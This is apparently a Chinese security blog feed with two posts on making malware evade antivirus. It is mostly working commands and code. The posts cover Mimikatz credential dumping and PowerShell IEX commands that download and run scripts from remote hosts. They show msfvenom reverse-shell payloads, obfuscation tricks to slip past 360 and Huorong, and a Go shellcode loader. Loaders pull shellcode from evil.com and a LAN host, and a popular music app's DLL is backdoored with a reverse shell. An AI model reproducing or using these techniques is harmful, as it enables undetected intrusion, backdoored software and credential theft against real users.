&quot;sekurlsa::logonPasswords full&quot;&#39;</code></p><p>或者<code>Invoke-Mimikatz -DumpCreds</code></p><h4 id="3-执行策略"><a href="#3-执行策略" class="headerlink" title="3.执行策略"></a>3.执行策略</h4><p>查看执行策略<code>powershell Get-ExecutionPolicy</code></p><p>powershell有六种执行策略：</p><pre><code class="hljs powershell">Unrestricted ：权限最高，可以不受限制执行任意脚本Restricted ：默认策略，不允许任意脚本的执行AllSigned ：所有脚本必须经过签名运行RemoteSigned ：本地脚本无限制，但是对来自网络的脚本必须经过签名Bypass ：没有任何限制和提示Undefined ：没有设置脚本的策略</code></pre><p>默认情况下，禁止脚本执行。除非管理员更改执行策略。</p><p><code>powershell Set-ExecutionPolicy Unrestricted</code>设置执行策略（需要管理员权限）</p><p>绕过执行策略执行大概有以下几种：</p><p><strong>本地读取然后通过管道符运行</strong></p><pre><code class="hljs shell">powershell Get-Content 1.ps1 | powershell -NoProfile -</code></pre><p><strong>远程下载并通过IEX运行脚本</strong></p><pre><code class="hljs shell">powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://47.94.80.129/ps/a.ps1&#x27;)&quot;</code></pre><p><strong>Bypass执行策略绕过</strong></p><pre><code class="hljs shell">powershell -ExecutionPolicy bypass -File ./a.ps1</code></pre><p>不会显示警告和提示</p><p><strong>Unrestricted执行策略标志</strong></p><pre><code class="hljs shell">powershell -ExecutionPolicy unrestricted -File ./a.ps1</code></pre><p>当运行一个从网上下载的未签名的脚本时，会给出权限提示</p><p>需要解释的是：</p><pre><code class="hljs shell">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。WindowStyle Hidden（-w Hidden）：隐藏窗口Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。Noexit（-Noe）：执行后不退出Shell。EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题</code></pre><h3 id="2-powershell加载shellcode方法"><a href="#2-powershell加载shellcode方法" class="headerlink" title="2.powershell加载shellcode方法"></a>2.powershell加载shellcode方法</h3><h4 id="1-msf-ps1本地执行-VT-20-59-过360"><a href="#1-msf-ps1本地执行-VT-20-59-过360" class="headerlink" title="1.msf-ps1本地执行(VT:20/59 过360)"></a>1.msf-ps1本地执行(VT:20/59 过360)</h4><p>用msfvenom生成powershell马，注意这里是<code>-f psh</code></p><pre><code class="hljs shell">msfvenom -p  windows/x64/meterpreter/reverse_https -e x86/shikata_ga_nai -i 15 -b &#x27;\x00&#x27; lhost=192.168.43.30 lport=3333 -f psh -o shell.ps1</code></pre><p>将shell.ps1拷贝到测试机器上，本地执行。</p><pre><code class="hljs shell">powershell.exe -ExecutionPolicy Bypass -NoExit -File  shell.ps1</code></pre><h4 id="2-Invoke-Shellcode加载（VT-shell-ps1-0-59）"><a href="#2-Invoke-Shellcode加载（VT-shell-ps1-0-59）" class="headerlink" title="2.Invoke-Shellcode加载（VT:shell.ps1-0/59）"></a>2.Invoke-Shellcode加载（VT:shell.ps1-0/59）</h4><p>先用msfvenom生成脚本木马</p><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.43.30 LPORT=3333 -f powershell -o shell.ps1</code></pre><p>在目标机器上执行</p><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.43.30/shell.ps1&quot;</span>)<span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-Shellcode</span> (<span class="hljs-variable">$buf</span>) <span class="hljs-literal">-Force</span>  运行木马</code></pre><h4 id="3-Invoke-Obfuscation对ps1免杀-VT-4-58"><a href="#3-Invoke-Obfuscation对ps1免杀-VT-4-58" class="headerlink" title="3.Invoke-Obfuscation对ps1免杀    (VT:4/58)"></a>3.Invoke-Obfuscation对ps1免杀    (VT:4/58)</h4><p>powershell的免杀方法有很多，对代码进行编码是最常见的一种，这里介绍一个专门用来对powershell进行编码免杀的框架Invoke-Obfuscation，这也是著名的APT32组织海莲花常用的一个工具。</p><p>Invoke-Obfuscation主要是对ps1脚本进行免杀，所以这里还是需要现有一个ps的payload，我还是用法1的msf生成的payload。</p><p>下载<code>Invoke-Obfuscation</code>：<code>git clone https://github.com/danielbohannon/Invoke-Obfuscation</code></p><p>进入Invoke-Obfuscation目录，在powershell中执行<code>Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation</code></p><p>然后执行<code>set scriptpath c:\test\shell.ps1</code> 指定待处理的Ps1文件，或者<code>set scriptblock &#39;echo xss&#39;</code>指定待处理的ps代码</p><p>然后输入<code>encoding</code>，再选择编码方式，比如1</p><p>然后执行<code>out c:\test\jiami.ps1</code>即可输出处理好的ps1文件.</p><p>本地执行可上线<code>powershell.exe -ExecutionPolicy Bypass -NoExit -File c:\test\jiami.ps1</code></p><h4 id="4-ps1行为免杀"><a href="#4-ps1行为免杀" class="headerlink" title="4.ps1行为免杀"></a>4.ps1行为免杀</h4><p>虽然ps1代码自身免杀，但在用powershell执行远程下载或执行shellcode时，很容易触发杀软行为规则。</p><p>对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。主要是对DownloadString、http做一些处理。</p><p>比如利用replace替换函数，可以bypass。</p><pre><code class="hljs csp">powershell -NoExit &quot;$c1=<span class="hljs-string">&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;</span>;$c2=<span class="hljs-string">&#x27;123(&#x27;</span><span class="hljs-string">&#x27;http://192.168.43.30/shell.ps1&#x27;</span><span class="hljs-string">&#x27;)&#x27;</span>.Replace(<span class="hljs-string">&#x27;123&#x27;</span>,<span class="hljs-string">&#x27;adString&#x27;</span>);IEX ($c1+$c2)&quot;</code></pre><p>可过360和火绒</p><h2 id="5-go"><a href="#5-go" class="headerlink" title="5.go"></a>5.go</h2><p>目标机器不一定有go环境，且go编译出来的exe大约2.3M左右，使用upx压缩下大约1.5M,不过相比python编译的exe应该还能接受了，免杀效果还比python-exe要好一些。</p><h3 id="1-Go嵌入shellcode"><a href="#1-Go嵌入shellcode" class="headerlink" title="1.Go嵌入shellcode"></a>1.Go嵌入shellcode</h3><p>先用msfvenom生成C语言的shellcode，注意要生成x64的。</p><pre><code class="hljs shell">msfvenom -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.43.30 lport=3333 -f c</code></pre><p>将shellcode转换成16进制的形式例如：\xfc-&gt;0xfc</p><p>将转换后的shellcode替换到下面的<code>shellcode_buf</code>位置，文件保存为<code>shell.go</code></p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">&quot;io/ioutil&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;syscall&quot;</span>    <span class="hljs-string">&quot;unsafe&quot;</span>)<span class="hljs-keyword">const</span> (    MEM_COMMIT             = <span class="hljs-number">0x1000</span>    MEM_RESERVE            = <span class="hljs-number">0x2000</span>    PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span>)<span class="hljs-keyword">var</span> (    kernel32       = syscall.MustLoadDLL(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)    ntdll          = syscall.MustLoadDLL(<span class="hljs-string">&quot;ntdll.dll&quot;</span>)    VirtualAlloc   = kernel32.MustFindProc(<span class="hljs-string">&quot;VirtualAlloc&quot;</span>)    RtlCopyMemory  = ntdll.MustFindProc(<span class="hljs-string">&quot;RtlCopyMemory&quot;</span>)    shellcode_buf = []<span class="hljs-keyword">byte</span>&#123;         <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x48</span>,  ----shellcode----, <span class="hljs-number">0xd5</span>,    &#125;)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkErr</span><span class="hljs-params">(err error)</span></span> &#123;    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-keyword">if</span> err.Error() != <span class="hljs-string">&quot;The operation completed successfully.&quot;</span> &#123;            <span class="hljs-built_in">println</span>(err.Error())            os.Exit(<span class="hljs-number">1</span>)        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;    shellcode := shellcode_buf    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(os.Args) &gt; <span class="hljs-number">1</span> &#123;        shellcodeFileData, err := ioutil.ReadFile(os.Args[<span class="hljs-number">1</span>])        checkErr(err)        shellcode = shellcodeFileData    &#125;    addr, _, err := VirtualAlloc.Call(<span class="hljs-number">0</span>, <span class="hljs-keyword">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)    <span class="hljs-keyword">if</span> addr == <span class="hljs-number">0</span> &#123;        checkErr(err)    &#125;    _, _, err = RtlCopyMemory.Call(addr, (<span class="hljs-keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="hljs-number">0</span>])), <span class="hljs-keyword">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)))    checkErr(err)    syscall.Syscall(addr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)&#125;</code></pre><p>安装golang，参考：<code>[https://www.runoob.com/go/go-environment.html](https://www.runoob.com/go/go-environment.html)</code></p><p>在命令行执行命令<code>go build</code>，编译生成<code>test.exe</code>，在测试机执行。不过大约两分钟后，360安全大脑提示云查杀报警了。</p><p>在网上还找到另外一个代码，不过执行和编译老出错，有兴趣的可以试一下，代码如下。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;C&quot;</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;unsafe&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;    buf := <span class="hljs-string">&quot;&quot;</span>    buf += <span class="hljs-string">&quot;xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c&quot;</span>    ...省略...    buf += <span class="hljs-string">&quot;xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2&quot;</span>    <span class="hljs-comment">// at your call site, you can send the shellcode directly to the C</span>    <span class="hljs-comment">// function by converting it to a pointer of the correct type.</span>    shellcode := []<span class="hljs-keyword">byte</span>(buf)    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="hljs-number">0</span>])))&#125;</code></pre><h3 id="2-Go加载器"><a href="#2-Go加载器" class="headerlink" title="2.Go加载器"></a>2.Go加载器</h3><h4 id="1-go-shellcode加载器-VT查杀率4-69"><a href="#1-go-shellcode加载器-VT查杀率4-69" class="headerlink" title="1.go-shellcode加载器(VT查杀率4/69)"></a>1.go-shellcode加载器(VT查杀率4/69)</h4><p>需要先下载加载器：<code>https://github.com/brimstone/go-shellcode</code></p><p>下载后，进入<code>go-shellcode\cmd\sc</code>目录，执行<code>go build</code>(cmd下即可)生成<code>sc.exe</code></p><p>然后用Msfvenom生成hex格式的shellcode</p><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o shell.hex LHOST=192.168.43.30 LPORT=3333</code></pre><p>使用sc加载器进行加载</p><pre><code class="hljs css"><span class="hljs-selector-tag">sc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">shellcode</span></code></pre><h4 id="2-gsl加载器"><a href="#2-gsl加载器" class="headerlink" title="2.gsl加载器"></a>2.gsl加载器</h4><p>gsl是<code>Jayl1n</code>根据go-shellcode进行了修改完善的工具。</p><p>下载gsl加载器：<code>wget https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip</code></p><p>包含两个版本，x86和x64。提供了三种加载方式</p><p>1、从参数传入 （必须是HEX格式）</p><pre><code class="hljs autoit">gsl -s SHELLCODE -<span class="hljs-built_in">hex</span></code></pre><p>2、从文件传入</p><p>加载 RAW 格式：<code>gsl -f shell.raw</code></p><p>加载 HEX 格式：<code>gsl -f shell.hex -hex</code></p><p>3、从远程服务器加载</p><p>把 SHELLCODE 文件挂在WEB目录下。（支持HTTP/HTTPS）</p><p>加载 RAW 格式：<code>gsl -u [http://evil.com/shell.raw](http://evil.com/shell.raw)</code></p><p>加载 HEX 格式：<code>gsl -u [http://evil.com/shell.hex](http://evil.com/shell.hex) -hex</code></p><p>以x64为例进行测试，先生成x64的shellcode</p><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.211.55.2 LPORT=3333 -f hex -o shell.hex</code></pre><p>试一下远程加载<code>gsl64.exe -u http://192.168.43.30/shell.hex -hex</code>即可上线</p><p>更多免杀参考：<a href="https://github.com/TideSec/BypassAntiVirus/">https://github.com/TideSec/BypassAntiVirus/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C/C++之11种方法免杀</tag>
      
      <tag>python之7种免杀方法</tag>
      
      <tag>c#之5种免杀方法</tag>
      
      <tag>powershell之4种免杀方法</tag>
      
      <tag>go之3种免杀方法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀一-工具免杀</title>
    <link href="/2020/10/03/%E5%85%8D%E6%9D%80%E4%B8%80-%E5%B7%A5%E5%85%B7%E5%85%8D%E6%9D%80/"/>
    <url>/2020/10/03/%E5%85%8D%E6%9D%80%E4%B8%80-%E5%B7%A5%E5%85%B7%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<p>本文简单的介绍一下杀软检测思路以及一些工具的使用。</p><a id="more"></a><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-常见杀软检测技术"><a href="#1-常见杀软检测技术" class="headerlink" title="1.常见杀软检测技术"></a>1.常见杀软检测技术</h3><h4 id="1-静态扫描技术"><a href="#1-静态扫描技术" class="headerlink" title="1.静态扫描技术"></a>1.静态扫描技术</h4><p>1.扫描压缩包（带密码的扫描不了）</p><p>2.急救盘扫描（杀软自带功能，u盘，攻击之后）</p><p>3.智能扫描（扫描磁盘是否有恶意文件）</p><p>4.全盘扫描</p><p>5.开机扫描</p><p>…</p><h4 id="2-动态监控技术"><a href="#2-动态监控技术" class="headerlink" title="2.动态监控技术"></a>2.动态监控技术</h4><p>1.内存监控</p><p>2.网页监控</p><p>3.行为监控（针对msf、cs）</p><p>…</p><h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2.检测方法"></a>2.检测方法</h3><p>1.特征码扫描</p><p>2.进程行为检测（沙盒法： <a href="https://app.any.run/%EF%BC%89">https://app.any.run/）</a></p><p>3.主动防御（杀软）</p><p>4.机器学习识别</p><p>…</p><h3 id="3-杀软绕过思路"><a href="#3-杀软绕过思路" class="headerlink" title="3.杀软绕过思路"></a>3.杀软绕过思路</h3><p>1.修改特征码</p><p>2.加壳（杀软已经把常见的壳加入到恶意规则里面了）</p><p>3.二次编译（写一个东西可以分离加载shellcode再进行编译）</p><p>4.分离免杀（通过下载加载shellcode）</p><p>…</p><h2 id="2-举例"><a href="#2-举例" class="headerlink" title="2.举例"></a>2.举例</h2><h4 id="1-msf"><a href="#1-msf" class="headerlink" title="1.msf"></a>1.msf</h4><h5 id="1-msf编码（老掉牙了，VT检测90-以上）"><a href="#1-msf编码（老掉牙了，VT检测90-以上）" class="headerlink" title="1.msf编码（老掉牙了，VT检测90%以上）"></a>1.msf编码（老掉牙了，VT检测90%以上）</h5><pre><code class="hljs shell">msf5 &gt; msfvenom -l encoders   #查看编码方式[*] exec: msfvenom -l encodersFramework Encoders [--encoder &lt;value&gt;]======================================    Name                          Rank       Description    ----                          ----       -----------  ...省略...    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder    ...省略...msf5 &gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe<span class="hljs-meta">#</span><span class="bash"> -i：编码次数 -e：选择excellent的编码方式</span>[*] exec: msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe...省略...</code></pre><h5 id="2-msf捆绑（被捆绑的软件不能正常使用）"><a href="#2-msf捆绑（被捆绑的软件不能正常使用）" class="headerlink" title="2.msf捆绑（被捆绑的软件不能正常使用）"></a>2.msf捆绑（被捆绑的软件不能正常使用）</h5><pre><code class="hljs shell">msf5 &gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.14 lport=1234 -x /root/example.exe -e x86/shikata_ga_nai -i 10 -f exe &gt; 1.exe<span class="hljs-meta">#</span><span class="bash">  -x:被捆绑的软件的目录  一般是与其他编码方式结合起来，降低被杀概率</span></code></pre><h5 id="3-msf内置免杀模块（老掉牙）"><a href="#3-msf内置免杀模块（老掉牙）" class="headerlink" title="3.msf内置免杀模块（老掉牙）"></a>3.msf内置免杀模块（老掉牙）</h5><pre><code class="hljs shell">msf5 &gt; search evasion  #搜索相应的模块Matching Modules================<span class="hljs-meta">   #</span><span class="bash">  Name                                                 Disclosure Date  Rank    Check  Description</span>   -  ----                                                 ---------------  ----    -----  -----------  ...省略...   5  evasion/windows/windows_defender_exe                                  normal  No     Microsoft Windows Defender Evasive Executable   ...省略...   Evaluationmsf5 &gt; use evasion/windows/windows_defender_exemsf5 evasion(windows/windows_defender_exe) &gt; </code></pre><h4 id="2-veil（老版kali自带，新版没有）"><a href="#2-veil（老版kali自带，新版没有）" class="headerlink" title="2.veil（老版kali自带，新版没有）"></a>2.veil（老版kali自带，新版没有）</h4><p>github项目地址：<a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p><p>结合msf使用示例：</p><p>veil设置：（生成的可执行文件VT检测70%左右）</p><pre><code class="hljs shell">root@kali:~/evasion/Veil# python3 Veil.py...省略...Main Menu        2 tools loadedAvailable Tools:        1)      Evasion#常用的模块        2)      OrdnanceAvailable Commands:#能够使用命令,后续每选择一次命令都会显示相应的可使用命令        exit                    Completely exit Veil        info                    Information on a specific tool        list                    List available tools        options                 Show Veil configuration        update                  Update Veil        use                     Use a specific tool<span class="hljs-meta">Veil&gt;</span><span class="bash">: use 1  <span class="hljs-comment">#选择模块</span></span>...省略......省略... Veil-Evasion Menu                                                                                                  41 payloads loaded                                                                                   Available Commands:                                                                                               back                    Go to Veil&#x27;s main menu                                                               checkvt                 Check VirusTotal.com against generated hashes  #检查VT上的免杀率                     clean                   Remove generated artifacts                                                          exit                    Completely exit Veil                                                                 info                    Information on a specific payload                                                   list                    List available payloads   #  列出能够使用的模块                                         use                     Use a specific payload                                                       Veil/Evasion&gt;: list                                                                                          ...省略... [*] Available Payloads:                                                                                           ...省略...                                                                      Veil/Evasion&gt;: use 22 #选择适合的payload...省略... Payload Information: ...省略...Required Options:                ...省略... Available Commands:                        back            Go back to Veil-Evasion        exit            Completely exit Veil        generate        Generate the payload#生成payload        options         Show the shellcode&#x27;s options        set             Set shellcode option<span class="hljs-meta">[powershell/meterpreter/rev_tcp&gt;</span><span class="bash">&gt;]: <span class="hljs-built_in">set</span> LHOST 192.168.3.17<span class="hljs-comment">#依据Required Options:进行相应的设置</span></span><span class="hljs-meta">[powershell/meterpreter/rev_tcp&gt;</span><span class="bash">&gt;]: generate</span>...省略...<span class="hljs-meta"> [&gt;</span><span class="bash">] Please enter the base name <span class="hljs-keyword">for</span> output files (default is payload): shell <span class="hljs-comment">#对payload进行命名，默认payload</span></span>...省略... [*] Language: powershell [*] Payload Module: powershell/meterpreter/rev_tcp [*] PowerShell doesn&#x27;t compile, so you just get text :) [*] Source code written to: /var/lib/veil/output/source/shell.bat #生可利用文件形式之一，后续均为各种可利用文件形式  [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/shell.rc Hit enter to continue...</code></pre><p>msf设置：</p><p>若选择bat文件，秩序msf执行监听即可</p><p>若选择rc文件，需要使用<code>-r</code>参数设置：<code>msfconsole -r /var/lib/veil/output/handlers/shell.rc</code></p><p>被攻击机执行生成的可执行文件即可收到会话</p><pre><code class="hljs shell">root@kali:~# msfconsole -r /var/lib/veil/output/handlers/shell.rc...省略...msf6 exploit(multi/handler) &gt; sessions -lActive sessions===============  Id  Name  Type                     Information       Connection  --  ----  ----                     -----------       ----------  1         meterpreter x86/windows  WIN7\haha @ WIN7  192.168.3.17:4444 -&gt; 192.168.3.21:49172 (192.168.3.21)msf6 exploit(multi/handler) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt;</code></pre><h4 id="3-venom"><a href="#3-venom" class="headerlink" title="3.venom"></a>3.venom</h4><p>github项目地址：<a href="https://github.com/r00t-3xp10it/venom">https://github.com/r00t-3xp10it/venom</a></p><p>安装不麻烦，就是使用中莫名其妙报错导致不能正常执行得到想要的/(ㄒoㄒ)/~~，法克，这个框架作者实时维护，可以一试。</p><h4 id="4-HackTheWorld-我实验的时候可以过360，后面不知道能不能行"><a href="#4-HackTheWorld-我实验的时候可以过360，后面不知道能不能行" class="headerlink" title="4.HackTheWorld(我实验的时候可以过360，后面不知道能不能行)"></a>4.HackTheWorld(我实验的时候可以过360，后面不知道能不能行)</h4><p>github项目地址：<a href="https://github.com/stormshadow07/HackTheWorld">https://github.com/stormshadow07/HackTheWorld</a></p><p>这里记录一个小问题，安装没有报错，但执行时提示没有termcolor，pip安装termcolor时提示</p><pre><code class="hljs shell">ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.</code></pre><p>只需执行<code>python -m pip install --upgrade setuptools</code>,升级一下setuptools就可。</p><pre><code class="hljs shell">[?] Enter Payload TYPE [tcp,https,tcp_dns]: tcp #选择协议tcp,https,tcp_dns [+] Payload TYPE : tcp [?] Enter LHOST for Payload [LHOST] : 192.168.3.17  #设置地址 [+] LHOST for Payload [LPORT] : 192.168.3.17 [?] Enter LPORT for Payload : 1234#设置端口 [+] LPORT for Payload : 1234...省略... [?] Enter the Key to Encrypt Shellcode with : xor#选择编码方式，有xor、base64...省略...[*]Do you want to add Manifest (Generally Bypasses Windows Defender)[ 1 or 0 ]?1#是否执行bypass...省略...[+] Final File with Manifest [./result/final_1234.exe]#生成文件路径</code></pre><p>但是比较大500kb+，一般马的大小100kb左右</p><h4 id="5-shellter（目前VT：24-66，可过360）"><a href="#5-shellter（目前VT：24-66，可过360）" class="headerlink" title="5.shellter（目前VT：24/66，可过360）"></a>5.shellter（目前VT：24/66，可过360）</h4><p>动态 shellcode 注入工具，可将shellcode注入到其它程序上，目前只能注入32位的可执行文件。</p><p>官网：<a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a> </p><p>主程序是.exe文件所以在windows下可以直接使用，在linux上运行需要安装wine环境来运行。</p><p>kali安装</p><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span>       <span class="hljs-comment">//更新一下</span>apt-<span class="hljs-built_in">get</span> install shellter    <span class="hljs-comment">//直接apt在线安装</span></code></pre><p>安装完成后再/usr/share/windows-resources/shellter  这个文件夹。hellter_Backups文件夹是注入文件后备份的文件夹，会自动把原文件备份一个到这个文件夹下。</p><p>过程就不贴图了，很简单，列一下会出现的几个要选择的点：</p><pre><code class="hljs shell">Choose Operation Mode - Auto/Manual (A/M/H)： //选择模式 A 自动模式自动注入后门，M高级模式，H帮助PE Target：            // 32位可执行文件绝对路径Enable Stealth Mode? (Y/N/H): Y               //是否启用隐身模式 输入Y启用 建议NUse a listed payload or custom? (L/C/H): L         //选择以列出的Payload还是自定义的Select payload by index: 1      //选择payload的序号SET LHOST：   //设置反弹回来的IP 本机SET LPORT：   //设置接收反弹的端口</code></pre><h4 id="6-the-backdoor-factory"><a href="#6-the-backdoor-factory" class="headerlink" title="6.the-backdoor-factory"></a>6.the-backdoor-factory</h4><p>github项目：<a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><strong>这个工具很强，但是做出来的东西VT检测将近50%，主流的杀软都过不了。。。</strong></p><p>使用之前先pip安装capstone、pefile</p><p>这是一个后门植入工具，原理是可执行二进制文件中有大量的 00，这些 00 是不包含数据的，将这些数据替换成 payload，并且在程序执行的时候，jmp 到代码段，来触发 payload。</p><p>常用的命令有</p><pre><code class="hljs shell">-h：帮助-f ：测试文件的路径-s show：查看被测试的文件可用的payload-H HOST：指定回连的IP-P PORT：指定回连的端口-J, --cave_jumping    Select this options if you want to use code cave                       jumping to further hide your shellcode in the binary.-a, --add_new_section                       Mandating that a new section be added to the exe                       (better success) but less av avoidance-U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE                       User supplied shellcode, make sure that it matches the                       architecture that you are targeting.-c：测试文件可利用缝隙大小-l SHELL_LEN, --shell_length=SHELL_LEN                       For use with -c to help find code caves of different                       sizes-o OUTPUT, --output-file=OUTPUT                       The backdoor output file-n NSECTION, --section=NSECTION                       New section name must be less than seven characters-d DIR, --directory=DIR                       This is the location of the files that you want to                       backdoor. You can make a directory of file backdooring                       faster by forcing the attaching of a codecave to the                       exe by using the -a setting.-w, --change_access   This flag changes the section that houses the codecave                       to RWE. Sometimes this is necessary. Enabled by                       default. If disabled, the backdoor may fail.-i, --injector        This command turns the backdoor factory in a hunt and                       shellcode inject type of mechanism. Edit the target                       settings in the injector module.-u SUFFIX, --suffix=SUFFIX                       For use with injector, places a suffix on the original                       file for easy recovery-D, --delete_original                       For use with injector module.  This command deletes                       the original file.  Not for use in production systems.                       *Author not responsible for stupid uses.*-O DISK_OFFSET, --disk_offset=DISK_OFFSET                       Starting point on disk offset, in bytes. Some authors                       want to obfuscate their on disk offset to avoid                       reverse engineering, if you find one of those files                       use this flag, after you find the offset.-S：检测文件是否支持后门-M, --cave-miner      Future use, to help determine smallest shellcode                       possible in a PE file-q, --no_banner       Kills the banner.-v, --verbose         For debug information output.-T IMAGE_TYPE, --image-type=IMAGE_TYPE                       ALL, x86, or x64 type binaries only. Default=ALL-Z, --zero_cert       Allows for the overwriting of the pointer to the PE                       certificate table effectively removing the certificate                       from the binary for all intents and purposes.-R, --runas_admin     EXPERIMENTAL Checks the PE binaries for                       &#x27;requestedExecutionLevel level=&quot;highestAvailable&quot;&#x27;. If                       this string is included in the binary, it must run as                       system/admin. If not in Support Check mode it will                       attmept to patch highestAvailable into the manifest if                       requestedExecutionLevel entry exists.-L, --patch_dll       Use this setting if you DON&#x27;T want to patch DLLs.                       Patches by default.-F FAT_PRIORITY, --fat_priority=FAT_PRIORITY                       For MACH-O format. If fat file, focus on which arch to                       patch. Default is x64. To force x86 use -F x86, to                       force both archs use -F ALL.-B BEACON, --beacon=BEACON                       For payloads that have the ability to beacon out, set                       the time in secs-m PATCH_METHOD, --patch-method=PATCH_METHOD                       Patching methods for PE files, &#x27;manual&#x27;,&#x27;automatic&#x27;,                       replace and onionduke-b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY                       For onionduke. Provide your desired binary.-X, --xp_mode         Default: DO NOT support for XP legacy machines, use -X                       to support XP. By default the binary will crash on XP                       machines (e.g. sandboxes)-A, --idt_in_cave     EXPERIMENTAL By default a new Import Directory Table                       is created in a new section, by calling this flag it                       will be put in a code cave.  This can cause bianry                       failure is some cases. Test on target binaries first.-C, --code_sign       For those with codesigning certs wishing to sign PE                       binaries only. Name your signing key and private key                       signingcert.cer and signingPrivateKey.pem repectively                       in the certs directory it&#x27;s up to you to obtain                       signing certs.-p, --preprocess      To execute preprocessing scripts in the preprocess                       directory</code></pre><p>使用举例，本次以酷狗音乐的最新安装程序为例</p><p>安装酷狗音乐，打开Process Explorer查找该软件运行的dll库，本次以msvcp140.dll为例。</p><pre><code class="hljs shell">root@kali:~/webtools/BypassAntiVirus/the-backdoor-factory# ./backdoor.py -f msvcp140.dll#查看可利用的payload...省略...The following WinIntelPE32s are available: (use -s)   cave_miner_inline   iat_reverse_tcp_inline   iat_reverse_tcp_inline_threaded   iat_reverse_tcp_stager_threaded   iat_user_supplied_shellcode_threaded   meterpreter_reverse_https_threaded   reverse_shell_tcp_inline#这里选择此模块获取shell   reverse_tcp_stager_threaded   user_supplied_shellcode_threadedroot@kali:~/webtools/BypassAntiVirus/the-backdoor-factory# ./backdoor.py -f msvcp140.dll -s reverse_shell_tcp_inline -P 6666 -H 192.168.3.17#选择模块，设置回连ip，port ...省略...[*] Available caves: 1. Section Name: .data; Section Begin: 0x60800 End: 0x62000; Cave begin: 0x61e86 End: 0x61ffc; Cave Size: 3742. Section Name: .idata; Section Begin: 0x62000 End: 0x63600; Cave begin: 0x63416 End: 0x635fc; Cave Size: 4863. Section Name: None; Section Begin: None End: None; Cave begin: 0x63634 End: 0x6380a; Cave Size: 470**************************************************[!] Enter your selection: 1#此处选择1（随意选）[!] Using selection: 1 ...省略...File msvcp140.dll is in the &#x27;backdoored&#x27; directory #生成文件的存储路径</code></pre><p>攻击机启动msf，进入<code>handler</code>，设置<code> set payload windows/shell_reverse_tcp,</code>以及回连port，ip，开启监听。</p><p>将生成的新dll文件（大小与原来的不一样）替换原来的dll文件，启动软件，msf即可得到一个会话。</p><p>注：选择的文件可能会导致软件不能正常运行。。。</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
